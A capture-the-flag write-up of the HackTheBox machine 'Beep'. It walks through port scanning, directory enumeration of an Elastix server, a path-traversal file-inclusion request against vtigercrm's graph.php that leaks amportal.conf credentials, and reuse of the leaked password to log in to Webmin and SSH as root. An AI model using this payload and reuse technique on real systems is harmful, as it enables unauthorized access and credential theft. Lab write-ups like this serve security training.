# Beep | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-ah8tqg4ksh]─[~]
└──╼ [★]$ nmap -A -p- -T4 10.129.1.226
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-14 06:56 UTC
Nmap scan report for 10.129.1.226
Host is up (0.22s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.129.1.226/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap?
443/tcp   open  ssl/https?
|_ssl-date: 2020-12-14T08:18:16+00:00; +1h03m38s from scanner time.
942/tcp   open  status     1 (RPC #100024)
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
|_mysql-info: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Host: 127.0.0.1

Host script results:
|_clock-skew: 1h03m37s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1309.35 seconds
```
The machine is running SSH, an Apache server running SSL (80/443), an Asterisk Call Manager service on port 5038 , another HTTP service on port 10000 and then some other services which nmap attempted to identify.

### 2. Enumeration
Starting with the main web server on 80/443, the main page is a login from to Elastix, which is a communications server software to enable stuff like IP PBX, email, IM and fax. Each function is controlled by another service. No default creds work for the login.  
I use gobuster to search for other directories from the root:
```bash
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-o7n31ucdvi]─[~]
└──╼ [★]$ gobuster dir -u https://10.129.1.226 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 30 -k===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.129.1.226
[+] Threads:        30
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/14 10:46:40 Starting gobuster
===============================================================
/images (Status: 301)
/help (Status: 301)
/themes (Status: 301)
/modules (Status: 301)
/mail (Status: 301)
/admin (Status: 301)
/static (Status: 301)
/lang (Status: 301)
/var (Status: 301)
/panel (Status: 301)
/libs (Status: 301)
/recordings (Status: 301)
/configs (Status: 301)
/vtigercrm (Status: 301)
===============================================================
2020/12/14 12:32:27 Finished
===============================================================
```
By trying to go to /admin, I get prompted for more credentials in a popup window. I try more default creds and get an "unauthorized" message, but I also get the version of the application the admin panel is for: `FreePBX 2.8.14`.  
  
Additionally I look into the other discorvered folders and find the following:
- /mail: roundcube webmail
- /lang: has different language text for Elastix, this does indicate it is Elastix 1.0, but no way to tell how accurate that is. Might be just the language files dont change between versions.
- /panel: "Flash Operator Panel" for Asterisk, appears to need Shockwave Flash (maybe this really is 1.0)- /recordings: Another login form, this time it's just the non-admin FreePBX 2.5 form.  
  
While I'm at it, port 10000 is the Webmin login page. Webmin is a system configuration tool for Linux, allowing administrators to manage the server via the web. I can't find any version information.
  

### 3. Read some files
After a few tests I try exploiting a local file inclusion vulnerability in graph.php, which is part of a CRM called vtiger used for Elastix. I navigated to https://10.129.1.226/vtigercrm/ and found another login page for it. I continue with the exploit (detailed as part of an exploit script at https://www.exploit-db.com/exploits/37637), browsing to graph.php and getting LFI through the current_language parameter. Using a proxy made this easy to exploit and tweak. Here is the request that worked:
```bash
GET /vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action HTTP/1.1
Host: 10.129.1.226
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: elastixSession=h8j1m5gu2rtj86r811uggin792; testing=1; PHPSESSID=jkdbb0qf8h099h6b94ta74nf36; ARI=qku5175lnonksij0jggibbffn5
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```
Retrieving the amportal.conf file (as done in the proof of concept) is great because it gives me some credentials including:
- Asterisk SQL: `asteriskuser:jEhdIekWmdjE`
- Asterisk portal: `admin:jEhdIekWmdjE`
- Flash operator panel password: `jEhdIekWmdjE`
- ARI admin password: `jEhdIekWmdjE`
It is clear there is heavy credential use on the machine. Knowing this, and knowing the webmin portal allows access to an admin user with the username root (by default), I can attempt to use this password to log in.

# Get a shell
With the credentials `root:jEhdIekWmdjE` I can log into the webmin panel, which ends up giving me root access to the machine. I can do everything, including use a web command shell where I can verify I am root. Additionally I can SSH into the machine, after specifying a supported algorithm.
```bash
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-o7n31ucdvi]─[~]
└──╼ [★]$ ssh root@10.129.1.226
Unable to negotiate with 10.129.1.226 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1

─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-o7n31ucdvi]─[~]
└──╼ [★]$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.129.1.226
The authenticity of host '10.129.1.226 (10.129.1.226)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.1.226' (RSA) to the list of known hosts.
root@10.129.1.226's password: 
Last login: Tue Sep 29 12:10:12 2020

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.129.1.226

[root@beep ~]# whoami
root
```
